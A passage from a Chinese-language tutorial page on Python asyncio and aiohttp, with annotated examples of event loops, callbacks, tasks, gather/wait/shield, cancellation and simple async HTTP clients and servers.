    print('Waiting {}'.format(x))
    await asyncio.sleep(x)
    print('Done after {}s'.format(x))

start = now()
new_loop = asyncio.new_event_loop()
t = Thread(target=start_loop, args=(new_loop,))
t.start()
print('TIME: {}'.format(time.time() - start))

asyncio.run_coroutine_threadsafe(do_some_work(6), new_loop)
asyncio.run_coroutine_threadsafe(do_some_work(4), new_loop)
'''
TIME: 0.0
Waiting 6
Waiting 4
Done after 4s
Done after 6s
'''

</textarea><pre>
【 协程调用协程 】
一个协程可以启动另一个协程,从而可以任务根据工作内容,封装到不同的协程中。可以在协程中使用await关键字,链式的调度协程,来形成一个协程任务流

</pre><textarea>
import asyncio

async def main():
    print("主协程")
    print("等待result1协程运行")
    res1 = await result1()
    print("等待result2协程运行")
    res2 = await result2(res1)
    return (res1, res2)

async def result1():
    print("这是result1协程")
    return "result1"

async def result2(arg):
    print("这是result2协程")
    return f"result2接收了一个参数,{arg}"

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    try:
        result = loop.run_until_complete(main())
        print(f"获取返回值:{result}")
    finally:
        print("关闭事件循环")
        loop.close()

# 输出
主协程
等待result1协程运行
这是result1协程
等待result2协程运行
这是result2协程
获取返回值:('result1', 'result2接收了一个参数,result1')
关闭事件循环

</textarea><pre>
【 协程中调用普通函数 】
在协程中可以通过一些方法去调用普通的函数。可以使用的关键字有call_soon,call_later,call_at。

call_soon
loop.call_soon(callback, *args, context=None)
调用立即返回,在下一个迭代的时间循环中立刻调用回调函数,大部分的回调函数支持位置参数,而不支持"关键字参数",如果是想要使用关键字参数,则推荐使用functools.aprtial()对方法进一步包装.可选关键字context允许指定要运行的回调的自定义contextvars.Context。当没有提供上下文时使用当前上下文。在Python 3.7中asyncio协程加入了对上下文的支持。使用上下文就可以在一些场景下隐式地传递变量,比如数据库连接session等,而不需要在所有方法调用显示地传递这些变量。

</pre><textarea>
import asyncio
import functools

def callback(args, *, kwargs="defalut"):
    print(f"普通函数做为回调函数,获取参数:{args},{kwargs}")

async def main(loop):
    print("注册callback")
    loop.call_soon(callback, 1)
    wrapped = functools.partial(callback, kwargs="not defalut")
    loop.call_soon(wrapped, 2)
    await asyncio.sleep(0.2)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(main(loop))
    finally:
        loop.close()

# 输出
注册callback
普通函数做为回调函数,获取参数:1,defalut
普通函数做为回调函数,获取参数:2,not defalut

</textarea><pre>
call_later
loop.call_later(delay, callback, *args, context=None)
延时去调用一个函数,事件循环在delay多长时间之后才执行callback函数

</pre><textarea>
import asyncio

def callback(n):
    print(f"callback {n} invoked")

async def main(loop):
    print("注册callbacks")
    loop.call_later(0.2, callback, 1)
    loop.call_later(0.1, callback, 2)
    loop.call_soon(callback, 3)
    await asyncio.sleep(0.4)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(main(loop))
    finally:
        loop.close()

# 输出
注册callbacks
callback 3 invoked
callback 2 invoked
callback 1 invoked

</textarea><pre>
call_at
loop.call_at(when, callback, *args, context=None)
call_at第一个参数的含义代表的是一个单调时间,它和平时说的系统时间有点差异,
这里的时间指的是事件循环内部时间,可以通过loop.time()获取,然后可以在此基础上进行操作。后面的参数和前面的两个方法一样。实际上call_later内部就是调用的call_at。

</pre><textarea>
import asyncio

def call_back(n, loop):
    print(f"callback {n} 运行时间点{loop.time()}")

async def main(loop):
    now = loop.time()
    print("当前的内部时间", now)
    print("循环时间", now)
    print("注册callback")
    loop.call_at(now + 0.1, call_back, 1, loop)
    loop.call_at(now + 0.2, call_back, 2, loop)
    loop.call_soon(call_back, 3, loop)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(main(loop))
    finally:
        loop.close()

# 输出
当前的内部时间 355769.156
循环时间 355769.156
注册callback
callback 3 运行时间点355769.156
callback 1 运行时间点355769.265
callback 2 运行时间点355769.359

</textarea>协程通过async/await语法进行声明,是编写异步应用的推荐方式<textarea>
import asyncio

async def main():
    print('Hello ...')
    await asyncio.sleep(1)  # 必须使用await关键字调用异步函数;不能在同步函数里使用await,否则会出错
    print('... World!')

# Python 3.7+, 打印"hello",等待1秒,然后打印"world"
asyncio.run(main())

</textarea><pre>
【 可等待对象 】
如果一个对象可以在await语句中使用,那么它就是可等待对象。许多asyncio API都被设计为接受可等待对象。
可等待对象有三种主要类型:协程,任务和Future

在本文档中"协程"可用来表示两个紧密关联的概念:
协程函数: 定义形式async de的函数
协程对象: 调用协程函数所返回的对象

asyncio也支持旧式的基于生成器的协程

</pre>Python协程属于可等待对象,因此可以在其他协程中被等待<textarea>
import asyncio

async def nested():
    return 42

async def main():
    # Nothing happens if we just call "nested()". A coroutine object is created but not awaited, so it *won't run at all*.
    nested()               # RuntimeWarning: coroutine 'nested' was never awaited
    # Let's do it differently now and await it:
    print(await nested())  # will print "42".

asyncio.run(main())

</textarea><pre>
【 任务 】
任务被用来设置日程以便并发执行协程。
当一个协程通过asyncio.create_task()等函数被打包为一个任务,该协程将自动排入日程准备立即运行

</pre><textarea>
import asyncio

async def nested():
    return 42

async def main():
    # Schedule nested() to run soon concurrently with "main()".
    task= asyncio.create_task(nested())

    # "task" can now be used to cancel "nested()", or can simply be awaited to wait until it is complete:
    await task

asyncio.run(main())

</textarea><pre>
【 Futures 】
Future是一种特殊的低层级可等待对象,表示一个异步操作的最终结果。
当一个Future对象被等待,这意味着协程将保持等待直到该Future对象在其他地方操作完毕。
在asyncio中需要Future对象以便允许通过async/await使用基于回调的代码。
通常情况下没有必要在应用层级的代码中创建Future对象。
Future对象有时会由库和某些asyncio API暴露给用户,用作可等待对象

</pre><textarea>
async def main():
    await function_that_returns_a_future_object()

    # this is also valid:
    await asyncio.gather(
        function_that_returns_a_future_object(),
        some_python_coroutine()
    )

</textarea><pre>
【 运行asyncio程序 】
asyncio.run(coro, *, debug=False)
执行coroutine coro并返回结果,此函数运行传入的协程,负责管理asyncio事件循环并完结异步生成器。
当有其他asyncio事件循环在同一线程中运行时,此函数不能被调用。
如果debug为True,事件循环将以调试模式运行。
此函数总是会创建一个新的事件循环并在结束时关闭之。它应当被用作asyncio程序的主入口点,理想情况下应当只被调用一次。
此函数是在Python3.7中加入asyncio模块,处于暂定基准状态

【 创建任务 】
asyncio.create_task(coro)
将coro协程打包为一个Task排入日程准备执行,返回Task对象。
该任务会在get_running_loop()返回的循环中执行,如果当前线程没有在运行的循环则会引发RuntimeError。
此函数在Python 3.7中被加入。在Python 3.7之前可以改用低层级的asyncio.ensure_future()函数。

</pre><textarea>
async def coro():
    pass

task = asyncio.create_task(coro())   # In Python 3.7+
task = asyncio.ensure_future(coro()) # This works in all Python versions but is less readable

</textarea><pre>
【 休眠 】
coroutine asyncio.sleep(delay, result=None)
阻塞delay指定的秒数,sleep()总是会挂起当前任务以允许其他任务运行。
如果指定了result则当协程完成时将其返回给调用者。

</pre>以下协程示例运行5秒,每秒显示一次当前日期<textarea>
import asyncio
import datetime

async def display_date():
    loop = asyncio.get_running_loop()
    end_time = loop.time() + 5.0
    while True:
        print(datetime.datetime.now())
        if (loop.time() + 1.0) >= end_time:
            break
        await asyncio.sleep(1)

asyncio.run(display_date())

</textarea><pre>
【 并发运行任务 】
awaitable asyncio.gather(*aws, loop=None, return_exceptions=False)
并发运行aws序列中的可等待对象。
如果aws中的某个可等待对象为协程,它将自动作为一个任务加入日程。
如果所有可等待对象都成功完成,结果将是一个由所有返回值聚合而成的列表,结果值的顺序与aws中可等待对象的顺序一致。
如果return_exceptions为False(默认),所引发的首个异常会立即传播给等待gather()的任务,aws序列中的其他可等待对象不会被取消并将继续运行。
如果return_exceptions为True,异常会和成功的结果一样处理,并聚合至结果列表。
如果gather()被取消,所有被提交(尚未完成)的可等待对象也会被取消。
如果aws序列中的任一Task或Future对象被取消,它将被当作引发了CancelledError一样处理,在此情况下gather()调用不会被取消。这是为了防止一个已提交的Task/Future被取消导致其他Tasks/Future也被取消。
如果gather本身被取消,则无论return_exceptions取值为何,消息都会被传播

gather起聚合的作用,把多个futures包装成单个future,因为loop.run_until_complete只接受单个future
run_until_complete是一个阻塞(blocking)调用,直到协程运行结束才返回,参数是一个future,但可以给它传协程对象,之所以能这样,是因为它在内部做了检查,通过ensure_future函数把协程对象包装(wrap)成了future。

loop.run_forever()执行之后会按照顺序执行,完成之后程序不会关闭,仍然处于开启状态

</pre><textarea>
import asyncio

async def factorial(name, number):
    f = 1
    for i in range(2, number + 1):
        print(f"Task {name}: Compute factorial({i})...")
        await asyncio.sleep(1)
        f *= i
    print(f"Task {name}: factorial({number}) = {f}")

async def main():
    # Schedule three calls *concurrently*:
    await asyncio.gather(
        factorial("A", 2),
        factorial("B", 3),
        factorial("C", 4),
    )

asyncio.run(main())

'''
Task A: Compute factorial(2)...
Task B: Compute factorial(2)...
Task C: Compute factorial(2)...
Task A: factorial(2) = 2
Task B: Compute factorial(3)...
Task C: Compute factorial(3)...
Task B: factorial(3) = 6
Task C: Compute factorial(4)...
Task C: factorial(4) = 24
'''

</textarea><pre>
【 屏蔽取消操作 】
awaitable asyncio.shield(aw, *, loop=None)
保护一个可等待对象防止其被取消,如果aw是一个协程,它将自动作为任务加入日程。

res = await shield(something())
相当于:
res = await something()
不同之处在于如果包含它的协程被取消,在something()中运行的任务不会被取消。从something()的角度看来,取消操作并没有发生。然而其调用者已被取消,因此"await"表达式仍然会引发CancelledError。

如果通过其他方式取消something() (例如在其内部操作) 则shield()也会取消。

</pre>如果希望完全忽略取消操作(不推荐)则shield()函数需要配合一个try/except代码段<textarea>
try:
    res = await shield(something())
except CancelledError:
    res = None

</textarea><pre>
【 超时 】
coroutine asyncio.wait_for(aw, timeout)
等待aw可等待对象完成,指定timeout秒数后超时。如果发生超时任务将取消并引发asyncio.TimeoutError,要避免任务取消,可以加上shield()。
如果aw是一个协程,它将自动作为任务加入日程。
timeout可以为None,也可以为float或int型数值表示的等待秒数。如果timeout为None则等待直到完成。
函数将等待直到目标对象确实被取消,所以总等待时间可能超过timeout指定的秒数。
如果等待被取消则aw指定的对象也会被取消。
当aw因超时被取消,wait_for会等待aw被取消。之前版本则将立即引发asyncio.TimeoutError

</pre><textarea>
async def eternity():
    # Sleep for one hour
    await asyncio.sleep(3600)
    print('yay!')

async def main():
    # Wait for at most 1 second
    try:
        await asyncio.wait_for(eternity(), timeout=1.0)
    except asyncio.TimeoutError:
        print('timeout!')

asyncio.run(main())

# timeout!

</textarea><pre>
【 简单等待 】
coroutine asyncio.wait(aws, timeout=None, return_when=ALL_COMPLETED)
并发运行aws指定的可等待对象并阻塞线程直到满足return_when指定的条件。
如果aws中的某个可等待对象为协程,它将自动作为任务加入日程。直接向wait()传入协程对象已弃用,因为这会导致令人迷惑的行为。
返回两个Task/Future集合: (done, pending)。
done, pending = await asyncio.wait(aws)
如指定timeout(float或int类型) 则它将被用于控制返回之前等待的最长秒数。
此函数不会引发asyncio.TimeoutError。当超时发生时未完成的Future或Task将在指定秒数后被返回。

return_when指定此函数应在何时返回。它必须为以下常数之一:
FIRST_COMPLETED 函数将在任意可等待对象结束或取消时返回。
FIRST_EXCEPTION 函数将在任意可等待对象因引发异常而结束时返回,当没有引发任何异常时它就相当于ALL_COMPLETED。
ALL_COMPLETED   函数将在所有可等待对象结束或取消时返回。

与wait_for()不同,wait()在超时发生时不会取消可等待对象。

</pre>wait()会自动将协程作为任务加入日程,以后将以(done, pending)集合形式返回显式创建的任务对象。因此以下代码并不会有预期的行为<textarea>
async def foo():
    return 42

coro = foo()
done, pending = await asyncio.wait({coro})

if coro in done:
    # This branch will never be run!

# 以上代码段的修正方法如下:
async def foo():
    return 42

task = asyncio.create_task(foo())
done, pending = await asyncio.wait({task})

if task in done:
    # Everything will work as expected now.

</textarea><pre>
asyncio.as_completed(aws, *, loop=None, timeout=None)
并发地运行aws集合中的可等待对象,返回一个Future对象的迭代器,返回的每个Future对象代表来自剩余可等待对象集合的最早结果。
如果在所有Future对象完成前发生超时则将引发asyncio.TimeoutError。

</pre><textarea>
for f in as_completed(aws):
    earliest_result = await f
    pass

</textarea><pre>
【 来自其他线程的日程安排 】
asyncio.run_coroutine_threadsafe(coro, loop)
向指定事件循环提交一个协程,线程安全。
返回一个concurrent.futures.Future以等待来自其他OS线程的结果。
此函数应该从另一个OS线程中调用,而非事件循环运行所在线程
不同与其他asyncio函数,此函数要求显式地传入loop参数

</pre><textarea>
# Create a coroutine
coro = asyncio.sleep(1, result=3)

# Submit the coroutine to a given loop
future = asyncio.run_coroutine_threadsafe(coro, loop)

# Wait for the result with an optional timeout argument
assert future.result(timeout) == 3

</textarea>如果在协程内产生了异常,将会通知返回的Future对象,它也可被用来取消事件循环中的任务<textarea>
try:
    result = future.result(timeout)
except asyncio.TimeoutError:
    print('The coroutine took too long, cancelling the task...')
    future.cancel()
except Exception as exc:
    print(f'The coroutine raised an exception: {exc!r}')
else:
    print(f'The coroutine returned: {result!r}')

</textarea><pre>
【 内省 】
asyncio.current_task(loop=None)
返回当前运行的Task实例,如果没有正在运行的任务则返回None。
如果loop为None则会使用get_running_loop()获取当前事件循环。

asyncio.all_tasks(loop=None)
返回事件循环所运行的未完成的Task对象的集合。
如果loop为None则会使用get_running_loop()获取当前事件循环。

【 Task对象 】
class asyncio.Task(coro, *, loop=None)
一个与Future类似的对象,可运行Python协程。非线程安全。
Task对象被用来在事件循环中运行协程。如果一个协程在等待一个Future对象,Task对象会挂起该协程的执行并等待该Future对象完成。当该Future对象完成,被打包的协程将恢复执行。

事件循环使用协同日程调度
 一个事件循环每次运行一个Task对象。而一个Task对象会等待一个Future对象完成,该事件循环会运行其他Task、回调或执行IO操作。

使用高层级的asyncio.create_task()函数来创建Task对象,也可用低层级的loop.create_task()或ensure_future()函数。不建议手动实例化Task对象。

要取消一个正在运行的Task对象可使用cancel()方法,调用此方法将使该Task对象抛出一个CancelledError异常给打包的协程。如果取消期间一个协程正在等待一个Future对象,该Future对象也将被取消。

cancelled()可被用来检测Task对象是否被取消。如果打包的协程没有抑制CancelledError异常并且确实被取消,该方法将返回True。

asyncio.Task从Future继承了其除Future.set_result()和Future.set_exception()以外的所有API。

Task对象支持contextvars模块。当一个Task对象被创建,它将复制当前上下文,然后在复制的上下文中运行其协程。

cancel()
请求取消Task对象,这将安排在下一轮事件循环中抛出一个CancelledError异常给被封包的协程。
协程在之后有机会进行清理甚至使用try ... ... except CancelledError ... finally代码块抑制异常来拒绝请求。不同于Future.cancel(),Task.cancel()不保证Task会被取消,虽然抑制完全取消并不常见,也很不鼓励这样做。

</pre>协程是如何侦听取消请求的<textarea>
async def cancel_me():
    print('cancel_me(): before sleep')

    try:
        await asyncio.sleep(3600)
    except asyncio.CancelledError:
        print('cancel_me(): cancel sleep')
        raise
    finally:
        print('cancel_me(): after sleep')

async def main():
    task= asyncio.create_task(cancel_me())
    await asyncio.sleep(1)
    task.cancel()
    try:
        await task
    except asyncio.CancelledError:
        print("main(): cancel_me is cancelled now")

asyncio.run(main())

# Expected output:
#
#     cancel_me(): before sleep
#     cancel_me(): cancel sleep
#     cancel_me(): after sleep
#     main(): cancel_me is cancelled now

</textarea><pre>
cancelled()
如果Task对象被取消则返回True。
当使用cancel()发出取消请求时Task会被取消,其封包的协程将传播被抛入的CancelledError异常。

done()
如果Task对象已完成则返回True。
当Task所封包的协程返回一个值、引发一个异常或Task本身被取消时则会被认为已完成。

result()
返回Task的结果。
如果Task对象已完成,其封包的协程的结果会被返回或当协程引发异常时该异常会被重新引发
如果Task对象被取消,此方法会引发一个CancelledError异常。
如果Task对象的结果还不可用,此方法会引发一个InvalidStateError异常。

exception()
返回Task对象的异常。
如果所封包的协程引发了一个异常,该异常将被返回。如果所封包的协程正常返回则该方法将返回None
如果Task对象被取消,此方法会引发一个CancelledError异常。
如果Task对象尚未完成,此方法将引发一个InvalidStateError异常。

add_done_callback(callback, *, context=None)
添加一个回调,将在Task对象完成时被运行。
此方法应该仅在低层级的基于回调的代码中使用。

remove_done_callback(callback)
从回调列表中移除 callback 。
此方法应该仅在低层级的基于回调的代码中使用。

get_stack(*, limit=None)
返回此Task对象的栈框架列表。
如果所封包的协程未完成,这将返回其挂起所在的栈。如果协程已成功完成或被取消,这将返回一个空列表。如果协程被一个异常终止,这将返回回溯框架列表。
框架总是从按从旧到新排序。
每个被挂起的协程只返回一个栈框架。
可选的limit参数指定返回框架的数量上限;默认返回所有框架。返回列表的顺序要看是返回一个栈还是一个回溯：栈返回最新的框架,回溯返回最旧的框架。(这与 traceback 模块的行为保持一致。)

print_stack(*, limit=None, file=None)
打印此Task对象的栈或回溯。
此方法产生的输出类似于traceback模块通过get_stack()所获取的框架。
limit参数会直接传递给get_stack()。
file参数是输出所写入的I/O流;默认情况下输出会写入sys.stderr。

classmethod all_tasks(loop=None)
返回一个事件循环中所有任务的集合。
默认情况下将返回当前事件循环中所有任务。如果 loop 为 None,则会使用 get_event_loop() 函数来获取当前事件循环。
此方法已弃用并将在Python 3.9中移除。请改用asyncio.all_tasks()函数。

classmethod current_task(loop=None)
返回当前运行任务或None。
如果loop为None则会使用get_event_loop()函数来获取当前事件循环。
此方法已弃用并将在Python 3.9中移除。请改用asyncio.current_task()函数

【 基于生成器的协程 】
对基于生成器的协程的支持已弃用并计划在Python 3.10中移除。
基于生成器的协程是async/await语法的前身,使用yield from语句创建的Python生成器,可以等待Future和其他协程。
基于生成器的协程应该使用@asyncio.coroutine装饰,虽然这并非强制

用asyncio提供的@asyncio.coroutine可以把一个generator标记为coroutine类型,然后在coroutine内部用yield from调用另一个coroutine实现异步操作。

为了简化并更好地标识异步IO,从Python 3.5开始引入了新的语法async和await,可以让coroutine的代码更简洁易读。

async和await是针对coroutine的新语法,要使用新的语法,只需要做两步简单的替换:
把@asyncio.coroutine替换为async;把yield from替换为await

</pre><textarea>
@asyncio.coroutine
def hello():
    print("Hello world!")
    r = yield from asyncio.sleep(1)
    print("Hello again!")

# 用新语法重新编写如下,剩下的代码保持不变
async def hello():
    print("Hello world!")
    r = await asyncio.sleep(1)
    print("Hello again!")

</textarea><pre>
@asyncio.coroutine
用来标记基于生成器的协程的装饰器,此装饰器不应该被用于async def协程
此装饰器使得旧式的基于生成器的协程能与async/await代码相兼容:

</pre><textarea>
@asyncio.coroutine
def old_style_coroutine():
    yield from asyncio.sleep(1)

async def main():
    await old_style_coroutine()

</textarea><pre>
asyncio.iscoroutine(obj)
如果obj是一个协程对象则返回True。
此方法不同于inspect.iscoroutine()因为它对基于生成器的协程返回True。

asyncio.iscoroutinefunction(func)
如果func是一个协程函数则返回True。
此方法不同于inspect.iscoroutinefunction()因为它对以@coroutine装饰的基于生成器的协程函数返回True。

asyncio的编程模型就是一个消息循环,从asyncio模块中直接获取一个EventLoop的引用,然后把需要执行的协程扔到EventLoop中执行,就实现了异步IO。把asyncio.sleep(1)看成是一个耗时1秒的IO操作,在此期间主线程并未等待,而是去执行EventLoop中其他可以执行的coroutine了,因此可以实现并发执行

</pre>async def用来定义内部有异步操作的异步函数,每个线程有一个事件循环,主线程调用asyncio.get_event_loop()时会创建事件循环,需要把异步的任务丢给这个循环的run_until_complete()方法,事件循环会安排协同程序的执行<textarea>
# 同步代码
import time

def hello():
    time.sleep(1)

def run():
    for i in range(5):
        hello()
        print('Hello World:%s' % time.time())  # 任何伟大的代码都是从Hello World开始的！

if __name__ == '__main__':
    run()

'''
输出:(间隔约是1s)
Hello World:1527595175.4728756
Hello World:1527595176.473001
Hello World:1527595177.473494
Hello World:1527595178.4739306
Hello World:1527595179.474482
'''

# 异步代码
import time
import asyncio

# 定义异步函数
async def hello():
    asyncio.sleep(1)
    print('Hello World:%s' % time.time())

def run():
    for i in range(5):
        loop.run_until_complete(hello())

loop = asyncio.get_event_loop()

if __name__ =='__main__':
    run()

'''
输出:
Hello World:1527595104.8338501
Hello World:1527595104.8338501
Hello World:1527595104.8338501
Hello World:1527595104.8338501
Hello World:1527595104.8338501
'''

</textarea>用asyncio实现Hello world代码<textarea>
import asyncio

@asyncio.coroutine
def hello():
    print("Hello world!")
    r = yield from asyncio.sleep(1)    # 异步调用asyncio.sleep(1)
    print("Hello again!")

loop = asyncio.get_event_loop()        # 获取EventLoop:
loop.run_until_complete(hello())       # 执行coroutine
loop.close()

# async/await语法
import asyncio

async def hello():
    print("Hello world!")
    r = await asyncio.sleep(1)    # 异步调用asyncio.sleep(1)
    print("Hello again!")

loop = asyncio.get_event_loop()        # 获取EventLoop:
loop.run_until_complete(hello())       # 执行coroutine
loop.close()

</textarea><pre>
@asyncio.coroutine把一个generator标记为coroutine类型,然后就把这个coroutine扔到EventLoop中执行。

hello()会首先打印出Hello world!,然后,yield from语法可以方便地调用另一个generator。由于asyncio.sleep()也是一个coroutine,所以线程不会等待asyncio.sleep(),而是直接中断并执行下一个消息循环。当asyncio.sleep()返回时,线程就可以从yield from拿到返回值(此处是None),然后接着执行下一行语句。

把asyncio.sleep(1)看成是一个耗时1秒的IO操作,在此期间主线程并未等待,而是去执行EventLoop中其他可以执行的coroutine了,因此可以实现并发执行。

</pre>用Task封装两个coroutine<textarea>
import threading
import asyncio

@asyncio.coroutine
def hello():
    print('Hello world! (%s)' % threading.currentThread())
    yield from asyncio.sleep(1)
    print('Hello again! (%s)' % threading.currentThread())

async def hello():
    print('Hello world! (%s)' % threading.currentThread())
    await asyncio.sleep(1)
    print('Hello again! (%s)' % threading.currentThread())

loop = asyncio.get_event_loop()
tasks = [hello(), hello()]
loop.run_until_complete(asyncio.wait(tasks))
loop.close()

# 观察执行过程:
Hello world! (<_MainThread(MainThread, started 140735195337472)>)
Hello world! (<_MainThread(MainThread, started 140735195337472)>)
(暂停约1秒)
Hello again! (<_MainThread(MainThread, started 140735195337472)>)
Hello again! (<_MainThread(MainThread, started 140735195337472)>)

</textarea><pre>
由打印的当前线程名称可以看出,两个coroutine是由同一个线程并发执行的。
如果把asyncio.sleep()换成真正的IO操作,则多个coroutine就可以由一个线程并发执行。

</pre>用asyncio的异步网络连接来获取sina、sohu和163的网站首页<textarea>
import asyncio

@asyncio.coroutine
def wget(host):
    print('wget %s...' % host)
    connect = asyncio.open_connection(host, 80)
    reader, writer = yield from connect
    header = 'GET / HTTP/1.0\r\nHost: %s\r\n\r\n' % host
    writer.write(header.encode('utf-8'))
    yield from writer.drain()
    while True:
        line = yield from reader.readline()
        if line == b'\r\n': break
        print('%s header > %s' % (host, line.decode('utf-8').rstrip()))
    writer.close()  # Ignore the body, close the socket

loop = asyncio.get_event_loop()
tasks = [wget(host) for host in ['www.sina.com.cn', 'www.sohu.com', 'www.163.com']]
loop.run_until_complete(asyncio.wait(tasks))
loop.close()

# 执行结果如下:
wget www.sohu.com...
wget www.sina.com.cn...
wget www.163.com...
(等待一段时间)
(打印出sohu的header)
www.sohu.com header > HTTP/1.1 200 OK
www.sohu.com header > Content-Type: text/html
...
(打印出sina的header)
www.sina.com.cn header > HTTP/1.1 200 OK
www.sina.com.cn header > Date: Wed, 20 May 2015 04:56:33 GMT
...
(打印出163的header)
www.163.com header > HTTP/1.0 302 Moved Temporarily
www.163.com header > Server: Cdn Cache Server V2.0
...
# 可见3个连接由一个线程通过coroutine并发完成。

</textarea><pre>
小结
asyncio提供了完善的异步IO支持;
异步操作需要在coroutine中通过yield from完成;
多个coroutine可以封装成一组Task然后并发执行。

</pre>
</div>

<div id="aiohttp">
<h4>aiohttp 实现单线程异步并发IO操作</h4><pre>
pip3 install aiohttp

并发http请求通常是用requests,但requests是同步的库,如果想异步的话需要引入aiohttp

asyncio可以实现单线程并发IO操作。如果仅用在客户端,发挥的威力不大。如果把asyncio用在服务器端如Web服务器,由于HTTP连接就是IO操作,因此可以用单线程+coroutine实现多用户的高并发支持。

asyncio实现了TCP、UDP、SSL等协议,aiohttp则是基于asyncio实现的HTTP框架。

Asynchronous HTTP client/server framework for asyncio and Python

</pre>server<textarea>
from aiohttp import web

# http://127.0.0.1:8080/admin
async def handle(request):
    name = request.match_info.get('name', "Anonymous")
    text = "Hello, " + name
    return web.Response(text=text)

async def wshandle(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)

    async for msg in ws:
        if msg.type == web.WSMsgType.text:
            await ws.send_str("Hello, {}".format(msg.data))
        elif msg.type == web.WSMsgType.binary:
            await ws.send_bytes(msg.data)
        elif msg.type == web.WSMsgType.close:
            break

    return ws

app = web.Application()
app.add_routes([web.get('/', handle), web.get('/echo', wshandle), web.get('/{name}', handle)])

if __name__ == '__main__':
    web.run_app(app)

</textarea><textarea>
'''
编写一个HTTP服务器,分别处理以下URL:
/ - 首页返回b'< h1>Index< /h1>';
/hello/{name} - 根据URL参数返回文本hello, %s!。
'''

import asyncio
from aiohttp import web

async def index(request):
    await asyncio.sleep(0.5)
    return web.Response(body=b'<h1>Index</h1>')

async def hello(request):
    await asyncio.sleep(0.5)
    text = '<h1>hello, %s!</h1>' % request.match_info['name']
    return web.Response(body=text.encode('utf-8'))

# aiohttp的初始化函数init()也是一个coroutine
async def init(loop):
    app = web.Application()
    app.router.add_route('GET', '/', index)
    app.router.add_route('GET', '/hello/{name}', hello)
    srv = await loop.create_server(app.make_handler(), '127.0.0.1', 8000)  # 利用asyncio创建TCP服务
    print('Server started at http://127.0.0.1:8000...')
    return srv

loop = asyncio.get_event_loop()
loop.run_until_complete(init(loop))
loop.run_forever()

</textarea>client<textarea>
import aiohttp, asyncio

async def fetch(session, url):
    async with session.get(url) as response:
        return await response.text()

async def main():
    async with aiohttp.ClientSession() as session:  # 使用ClientSession来管理会话
        html = await fetch(session, 'http://python.org')
        print(html)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())

</textarea>这里引入一个类,from aiohttp import ClientSession,首先建立一个session对象,然后用session对象去打开网页,session可以进行多项操作如post、get、put、head等<textarea>
import aiohttp
async def get_news(size=10):
    all_news, readhub_api = [], "https://api.readhub.me/topic"
    #  # conn = aiohttp.ProxyConnector(proxy="http://127.0.0.1:8087")
    async with aiohttp.ClientSession() as client:
        headers = {'content-type': 'application/json'}
        params = {'pageSize': size}
        async with client.get(readhub_api, params=params, headers=headers) as response:  # 启动
            assert response.status == 200
            result = await response.json()  # 获取的数据

        for value in result.get('data', []):    # 稍微整理数据
            each_data = {}
            each_data['title'] = value.get('title')
            each_data['summary'] = value.get('summary')
            each_data['news_info'] = value.get('newsArray')
            each_data['updated_at'] = value.get('updatedAt')
            all_news.append(each_data)
        return all_news

async def index_json():
    nums = 2
    return await get_news()  # 获取数据

</textarea><textarea>
# 首先async def关键字定义了这是个异步函数,await关键字加在需要等待的操作前面,response.read()等待request响应,是个耗IO操作。然后使用ClientSession类发起http请求
import asyncio
from aiohttp import ClientSession

tasks = []
url = "https://www.baidu.com/{}"

async def hello(url):
    async with ClientSession() as session:
        async with session.get(url) as response:
            response = await response.read()
            print(response.decode())

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(hello(url))

</textarea><pre>
多链接异步访问
如果需要请求多个URL,同步的做法访问多个URL只需要加个for循环就可以了,但异步的实现方式并没那么容易,在之前的基础上需要将hello()包装在asyncio的Future对象中,然后将Future对象列表作为任务传递给事件循环

</pre><textarea>
import time
import asyncio
from aiohttp import ClientSession

tasks = []
url = "https://www.baidu.com/{}"
async def hello(url):
    async with ClientSession() as session:
        async with session.get(url) as response:
            response = await response.read()
            #print(response)
            print('Hello World:%s' % time.time())

def run():
    for i in range(5):
        Task= asyncio.ensure_future(hello(url.format(i)))
        tasks.append(task)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    run()
    loop.run_until_complete(asyncio.wait(tasks))

'''
输出:
Hello World:1527754874.8915546
Hello World:1527754874.899039
Hello World:1527754874.90004
Hello World:1527754874.9095392
Hello World:1527754874.9190395
'''

</textarea><textarea>
import asyncio
import time
import aiohttp

headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Mobile Safari/537.36'}
urls = ['https://v3.bootcss.com/getting-started/','https://v3.bootcss.com/getting-started/','https://v3.bootcss.com/getting-started/']

# 使用该模块的ClientSession进行网络请求发送
async def get_page(url):
    async with aiohttp.ClientSession() as session:
        # 发post请求 即async with await session.post(url) as response
        # u-a伪装 async with await session.post(url,headers={xxxx}) as response
        # 参数处理 get==> params   post ===> data,代理ip：proxy = 'xxxx'(字符串)
        async with await session.get(url) as response: #得到相应对象,有耗时阻塞要await挂起,获取响应数据之前一定要用await手动挂起
            page_text = await response.text() #返回字符串形式二进制 read()为二进制 json()为json
            print(page_text)

tasks = []
start = time.time()

for url in urls:
    c = get_page(url)
    task = asyncio.ensure_future(c)
    tasks.append(task)

loop = asyncio.get_event_loop()
loop.run_until_complete(asyncio.wait(tasks))
print(time.time()-start)

</textarea>asyncio实现并发就需要多个协程来完成任务,每当有任务阻塞的时候就await,然后其他协程继续工作。创建多个协程的列表,然后将这些协程注册到事件循环中<textarea>
import asyncio, time
now = lambda: time.time()

async def do_some_work(x):
    print('Waiting: ', x)
    await asyncio.sleep(x)
    return 'Done after {}s'.format(x)

start = now()
coroutine1 = do_some_work(1)
coroutine2 = do_some_work(2)
coroutine3 = do_some_work(4)
tasks = [
    asyncio.ensure_future(coroutine1),
    asyncio.ensure_future(coroutine2),
    asyncio.ensure_future(coroutine3)
]
loop = asyncio.get_event_loop()
loop.run_until_complete(asyncio.wait(tasks))
for task in tasks:
    print('Task ret: ', task.result())
print('TIME: ', now() - start)
'''
Waiting:  1
Waiting:  2
Waiting:  4
Task ret:  Done after 1s
Task ret:  Done after 2s
Task ret:  Done after 4s
TIME:  4.003541946411133
'''

</textarea><pre>
收集http响应
